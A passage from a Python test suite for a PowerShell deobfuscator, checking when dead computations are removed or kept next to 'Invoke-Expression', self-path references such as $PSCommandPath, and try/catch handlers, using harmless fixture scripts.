                Invoke-Expression $c
                & { $Null = [Math]::Sqrt(144) }
                Write-Host done
            """)),
            cleandoc("""
                Invoke-Expression $c
                & {
                  $Null = [Math]::Sqrt(144)
                }
                Write-Host done
            """))

    def test_a_read_in_a_stored_body_is_kept_ahead_of_the_leak(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
                $b = { $Null = [Math]::Sqrt(144) }
                Invoke-Expression $c
                & $b
                Write-Host done
            """)),
            cleandoc("""
                $b = {
                  $Null = [Math]::Sqrt(144)
                }
                Invoke-Expression $c
                & $b
                Write-Host done
            """))

    def test_the_same_nested_body_read_is_stripped_when_no_leak_opens_the_world(self):
        self._assertDeobfuscatesToOneOf(
            """
                & { $Null = [Math]::Sqrt(144) }
                Write-Host done
            """,
            '& {}\nWrite-Host done',
            'Write-Host done',
        )

    @opportunity
    def test_an_invoked_block_left_empty_goes_with_its_invocation(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
                & { $Null = [Math]::Sqrt(144) }
                Write-Host done
            """)),
            'Write-Host done',
        )


class TestPs1AScriptThatNamesItsOwnPathIsRefusedWhole(TestPs1):

    _MENTIONS_AND_TWINS = (
        ('Write-Host $PSCommandPath', 'Write-Host $q'),
        ('Write-Host $MyInvocation', 'Write-Host $q'),
        ('Write-Host $PSScriptRoot', 'Write-Host $q'),
        ('Write-Host "at ${PSScriptRoot}"', 'Write-Host "at ${q}"'),
        ("Write-Host 'at $PSCommandPath'", "Write-Host 'at $q'"),
        ('Get-Variable MyInvocation', 'Get-Variable Unrelated'),
        ('Get-PSCallStack', 'Get-Culture'),
        (
            'Write-Host ([Environment]::GetCommandLineArgs())',
            'Write-Host ([Environment]::GetEnvironmentVariables())',
        ),
    )

    def _script_with_tail(self, tail: str) -> str:
        return cleandoc(F"""
            $Null = [Math]::Sqrt(144)
            Invoke-Expression $c
            {tail}
        """)

    def test_a_read_ahead_of_the_leak_is_kept_under_every_spelling_of_the_self_path(self):
        for mention, _ in self._MENTIONS_AND_TWINS:
            with self.subTest(mention):
                source = self._script_with_tail(mention)
                self.assertEqual(self._deobfuscate(source), source)

    def test_the_same_read_goes_when_the_self_path_naming_is_absent(self):
        for _, twin in self._MENTIONS_AND_TWINS:
            with self.subTest(twin):
                self.assertEqual(
                    self._deobfuscate(self._script_with_tail(twin)),
                    cleandoc(F"""
                        Invoke-Expression $c
                        {twin}
                    """))

    def test_a_self_path_name_without_a_leak_does_not_keep_the_read(self):
        self.assertEqual(
            self._deobfuscate('$Null = [Math]::Sqrt(144); Write-Host $PSCommandPath'),
            'Write-Host $PSCommandPath')


class TestPs1AHandlerElsewhereDoesNotGuardABodyTheStatementItselfRuns(TestPs1):

    def test_a_discarded_pipeline_is_removed_beside_an_unrelated_handler(self):
        self.assertEqual(
            self._deobfuscate(cleandoc("""
                $zzq = 1, 2 | ForEach-Object { [int]"x$_" }
                try {
                  Write-Host A
                } catch {
                  Write-Host B
                }
            """)),
            cleandoc("""
                try {
                  Write-Host A
                } catch {
                  Write-Host B
                }
            """))

    def test_the_same_pipeline_is_kept_under_a_handler_that_stands_over_it(self):
        guarded = cleandoc("""
            try {
              $zzq = 1, 2 | ForEach-Object {
                [int]"x${_}"
              }
              Write-Host A
            } catch {
              Write-Host B
            }
        """)
        self.assertEqual(self._deobfuscate(guarded), guarded)
